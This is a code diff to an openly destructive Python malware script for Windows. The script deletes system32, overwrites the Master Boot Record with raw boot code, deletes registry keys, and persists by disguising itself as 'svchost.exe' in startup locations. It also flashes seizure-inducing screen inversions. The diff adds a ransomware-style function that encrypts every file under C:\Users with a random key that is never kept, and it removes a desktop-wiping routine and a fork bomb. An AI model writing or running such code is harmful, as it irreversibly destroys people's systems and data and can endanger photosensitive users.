@@ -8,11 +8,10 @@ import winreg
 import shutil
 from win32file import *
 import win32gui
+from cryptography.fernet import Fernet
 
 #FURTHER CONSIDERATION
 #https://github.com/SomeoneAlt-86/pc-killer/blob/main/pcKill.bat
-
-flag = False
 
 #GDI effects (seizure warning)
 def epilepsy():
@@ -24,7 +23,6 @@ def epilepsy():
         win32gui.InvertRect(hdc, (0, 0, w ,h))
 
 #Uses robocopy to bypass permission issues when attempting to delete system32.
-#Also deletes everything on desktop for fun (except the executable itself, in case it was run from desktop)
 def corrupt():
     with tempfile.TemporaryDirectory() as empty:
         subprocess.Popen(
@@ -33,13 +31,6 @@ def corrupt():
             stdout=subprocess.PIPE,  # Redirect standard output and error
             stderr=subprocess.PIPE
         ).communicate()
-    desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
-    desktop_files = os.listdir(desktop_path)
-    remove_files = [file for file in desktop_files if file.lower() != os.path.basename(sys.argv[0]).lower()]
-
-    for f in remove_files:
-        if os.path.isfile(os.path.join(desktop_path, f)):
-            os.remove(os.path.join(desktop_path, f))
 
 #Sets wallpaper using image data in base64 format
 # def set_wallpaper(base64_data):
@@ -63,7 +54,7 @@ def del_reg():
 def persist():
     program_name = "svchost.exe"
     path1 = os.path.join(os.environ['ProgramData'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', program_name)
-    path2 = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Maintenance', program_name)
+    path2 = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows', 'Explorer', program_name)
     shutil.copy(sys.argv[0], path1)
     shutil.copy(sys.argv[0], path2)
 
@@ -71,7 +62,7 @@ def persist():
     winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, path2)
     winreg.CloseKey(key)
 
-#Overrides the Master Boot Record (MBR) lol. GG
+#Overrides the Master Boot Record lol GG
 def mbr():
     data = (
     b'\xBB\x00\xA0\x8E\xC3\xDB\xE3\xB8\x13\x00\xCD\x10\x31\xFF\x8E\xDF'
@@ -90,18 +81,32 @@ def mbr():
         WriteFile(hDevice, data, None)
         CloseHandle(hDevice)
 
+#Encrypts everything in the Users directory with a randomly generated AES256 key
+def encrypt():
+    key = Fernet.generate_key()
+    for root, _, filenames in os.walk("C:\\Users"):
+        for filename in filenames:
+            file_path = os.path.join(root, filename)
+            if file_path != os.path.abspath(sys.argv[0]):  # Exclude the script file itself
+                try:
+                    with open(file_path, "rb") as file:
+                        contents = file.read()
+                    cipher_suite = Fernet(key)
+                    contents_encrypted = cipher_suite.encrypt(contents)
+                    with open(file_path, "wb") as file:
+                        file.write(contents_encrypted)
+                except Exception as e:
+                    pass
+
+
 def main():
-    global flag
     corrupt()
     mbr()
     del_reg()
     persist()
     set_wallpaper()
+    encrypt()
     epilepsy()
-    flag = True
 
 if __name__ == "__main__":
     main()
-    #Infinitely spawns new processes with new consoles to lag/crash the system
-    while flag:
-        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
